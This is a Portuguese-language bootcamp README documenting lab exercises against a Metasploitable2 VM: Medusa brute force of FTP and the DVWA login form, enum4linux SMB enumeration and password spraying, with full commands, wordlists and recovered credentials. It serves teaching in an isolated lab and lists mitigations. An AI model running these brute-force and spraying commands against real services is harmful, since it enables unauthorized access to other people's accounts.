#  🌍 Bootcamp Cibersegurança - Atividades Práticas
[ [

## Descrição
Repositório dedicado às anotações e atividades práticas do bootcamp de Cibersegurança. Este README documenta as três primeiras atividades realizadas em ambiente controlado com Kali Linux e Metasploitable2 na VirtualBox. O foco é em ataques de brute force e enumeração SMB, demonstrando vulnerabilidades comuns em serviços como FTP, formulários web e SMB.

**Autor:** Murilo Oliveira  
**Data:** 20 de Abril de 2026  
**Ambiente:** Kali Linux + Metasploitable2 (IP: 192.168.56.102)

## Pré-requisitos
- VirtualBox instalado
- Imagens: Kali Linux e Metasploitable2
- Snapshot da Metasploitable2 criado antes dos testes

## 📋 1ª Atividade: Ataque Brute Force com Medusa (FTP)

### Configuração Inicial
- Instalar e configurar Kali Linux na VirtualBox.
- Instalar e configurar Metasploitable2 na VirtualBox.
- Criar snapshot da Metasploitable2 (backup).

### Coleta de IP (Metasploitable2)
```bash
ip a
```
IP obtido: `192.168.56.102`.

### Teste de Conectividade (Kali)
```bash
ping -c 3 192.168.56.102
```
```
PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.630 ms
64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=0.340 ms
64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=0.394 ms
--- 192.168.56.102 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2060ms
rtt min/avg/max/mdev = 0.340/0.454/0.630/0.125 ms
```

### Scan de Portas (Nmap)
```bash
nmap -sV -p 21,22,80,445,139 192.168.56.102
```
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-20 07:44 -0400
Nmap scan report for 192.168.56.102
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

### Verificação FTP
```bash
ftp 192.168.56.102
```
```
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:kali):
```
Porta 21 aberta (vsFTPd 2.3.4).

### Criação de Wordlists
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### Ataque Medusa (FTP)
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```
**Parâmetros:**
- `-h`: Host (IP alvo)
- `-U`: Arquivo de usuários
- `-P`: Arquivo de senhas
- `-M ftp`: Módulo FTP
- `-t 6`: 6 threads

**Resultado:**
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### Verificação Manual
```bash
ftp 192.168.56.102
Name: msfadmin
Password: msfadmin
```
```
230 Login successful.
```
Acesso confirmado.

## 🌐 2ª Atividade: Brute Force em Formulários Web (DVWA)

### Inspeção do Formulário
- Acessar: `http://192.168.56.102/dvwa/login.php`
- Painel DevTools (F12) > Network
- Teste falho: Username `Murioz`, Password `123` → "Login Failed"

**Parâmetros identificados:** `username=^USER^&password=^PASS^&Login=Login`

### Wordlists (Reutilizadas)
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### Ataque Medusa (HTTP)
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
**Parâmetros:**
- `-M http`: Módulo HTTP
- `-m PAGE`: Caminho do formulário
- `-m FORM`: Corpo da requisição
- `-m FAIL`: String de falha
- `-t 6`: Threads

**Resultados (exemplos):**
```
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: 123456 [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: 123456 [SUCCESS]
...
```

### Verificação Manual
- User: `admin`, Password: `password` → Login bem-sucedido.

## 🔗 3ª Atividade: Enumeração SMB + Password Spraying

### Enumeração de Usuários (enum4linux)
```bash
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```
**Parâmetros:**
- `-a`: Todas as técnicas de enumeração
- `tee`: Salvar saída em arquivo

**Usuários enumerados (principais):**
- msfadmin (RID: 0xbb8)
- user (RID: 0xbba)
- root, service, etc.

**Shares:**
- tmp (acesso OK)
- opt, print$, ADMIN$, IPC$ (negados)

**Visualizar saída:**
```bash
less enum4_output.txt  # Digite 'y' para ver
```

### Wordlists para Spraying
```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

### Ataque Medusa (SMBNT)
```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
**Parâmetros:**
- `-M smbnt`: Módulo SMBNT
- `-t 2`: Threads
- `-T 50`: Hosts paralelos (delay ~5s)

**Resultado:**
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### Verificação Manual
Senha inválida:
```bash
smbclient -L //192.168.56.102 -U msfadmin
```
```
NT_STATUS_LOGON_FAILURE
```

Senha válida:
```bash
smbclient -L //192.168.56.102 -U msfadmin%msfadmin
```
```
Sharename     Type      Comment
msfadmin      Disk      Home Directories
tmp           Disk      oh noes!
...
```
Acesso confirmado (ADMIN$ permitido).

## Conclusão
As atividades demonstram brute force em FTP, web forms e SMB com password spraying, destacando vulnerabilidades em serviços desatualizados. Sempre realize testes em ambientes isolados. Próximas etapas: Mitigações como senhas fortes, rate limiting e monitoramento. [dev](https://dev.to/reginadiana/como-escrever-um-readme-md-sensacional-no-github-4509)
